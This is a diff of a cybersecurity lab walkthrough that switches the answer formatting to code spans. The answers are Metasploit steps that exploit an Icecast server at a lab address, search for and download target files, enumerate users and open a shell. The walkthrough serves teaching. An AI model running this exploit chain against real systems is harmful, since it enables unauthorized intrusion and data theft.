@@ -51,7 +51,7 @@ You've been provided full access to the network and are getting ping responses f
 
     - Run the Nmap command that performs a service and version scan against the target.
 
-      > Answer: nmap -sV 192.168.0.20
+      > Answer: ```nmap -sV 192.168.0.20```
 
 ![nmap](images/nmap.jpg)
 
@@ -60,7 +60,7 @@ You've been provided full access to the network and are getting ping responses f
  
    - Run the SearchSploit commands to show available Icecast exploits.
   
-     > Answer: **_searchsploit icecast_**
+     > Answer: ```searchsploit icecast```
 
 ![searchicecast](images/searchsploit.jpg)
 
@@ -68,14 +68,14 @@ You've been provided full access to the network and are getting ping responses f
  
    - Run the command that starts Metasploit:
     
-     > Answer: **_msfconsole_**
+     > Answer: ```msfconsole```
  
  
 4. Search for the Icecast module and load it for use.
  
    - Run the command to search for the Icecast module:
      
-     > Answer: **_use exploit/windows/http/icecast_header_**
+     > Answer: ```use exploit/windows/http/icecast_header```
 
 ![useicecast](images/useicecast.jpg)
  
@@ -84,24 +84,24 @@ You've been provided full access to the network and are getting ping responses f
 
        **Note:** Instead of copying the entire path to the module, you can use the number in front of it.
 
-     > Answer: **_use 0_**
+     > Answer: ```use 0```
  
  
 5. Set the `RHOST` to the target machine.
  
    - Run the command that sets the `RHOST`:
       
-     > Answer: **_set RHOSTS 192.168.0.20_**
+     > Answer: ```set RHOSTS 192.168.0.20```
  
 6. Run the Icecast exploit.
  
    - Run the command that runs the Icecast exploit.
       
-     > Answer: **_exploit_**
+     > Answer: ```exploit```
 
      - Run the command that performs a search for the `secretfile.txt` on the target.
       
-     > Answer: **_search -f *secretfile*.txt_**
+     > Answer: ```search -f *secretfile*.txt```
 
 ![question6](images/question6.jpg)
   
@@ -109,20 +109,20 @@ You've been provided full access to the network and are getting ping responses f
  
     - Run the command to performs a search for the `recipe.txt` on the target:
 
-      > Answer: **_"search -f *recipe*.txt"_**
+      > Answer: ```search -f *recipe*.txt```
  
  
     - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:
 
 
-      > Answer: **_download /users/ieuser/documents/Drinks.recipe.txt_**
+      > Answer: ```download /users/ieuser/documents/Drinks.recipe.txt```
 
 ![question7](images/question7.jpg)
  
 
 8. You can also use Meterpreter's local exploit suggester to find possible exploits.
 
-**_run post/multi/recon/local_exploit_suggester_**
+```run post/multi/recon/local_exploit_suggester```
 
 ![question8](images/question8.jpg)
  
@@ -134,20 +134,20 @@ You've been provided full access to the network and are getting ping responses f
  
 A. Run a Meterpreter post script that enumerates all logged on users.
 
-  > Answer: **_run post/windows/gather/enum_logged_on_users_**
+  > Answer: ```run post/windows/gather/enum_logged_on_users```
 
   ![A](images/A.jpg)
  
      
 B. Open a Meterpreter shell and gather system information for the target.
  
-  > Answer: **_shell_**
+  > Answer: ```shell```
 
   ![B](images/B.jpg)
  
 C. Run the command that displays the target's computer system information:
 
-   > Answer: **_systeminfo_**
+   > Answer: ```systeminfo```
 
    ![C](images/C.jpg)
 
